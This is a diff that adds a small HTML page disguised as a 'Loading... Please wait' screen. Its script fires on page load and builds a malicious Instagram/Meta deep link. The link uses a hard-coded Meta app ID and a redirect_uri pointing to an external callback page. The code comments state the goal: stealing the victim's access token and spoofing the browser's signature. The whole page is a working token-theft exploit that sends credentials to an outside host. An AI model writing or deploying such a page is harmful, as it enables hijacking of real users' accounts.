@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    
+    <script>
+        // 1. The URL where Instagram should send the stolen token
+        const attackerCallbackUrl = encodeURIComponent("https://linus-1723.github.io/test/callback.html");
+        
+        // 2. A real Meta App ID (we pulled this from your earlier logs)
+        const appId = "567067343352427";
+
+        // 3. Construct the malicious LVA deep link
+        // We omit the 'bn' parameter to force the app to spoof the browser's signature
+        const exploitUrl = `xapplva://?app_id=${appId}&redirect_uri=${attackerCallbackUrl}&state=hacked`;
+
+        // 4. Fire the exploit
+        setTimeout(() => {
+            window.location.href = exploitUrl;
+        }, 1000);
+    </script>
+</body>
+</html>
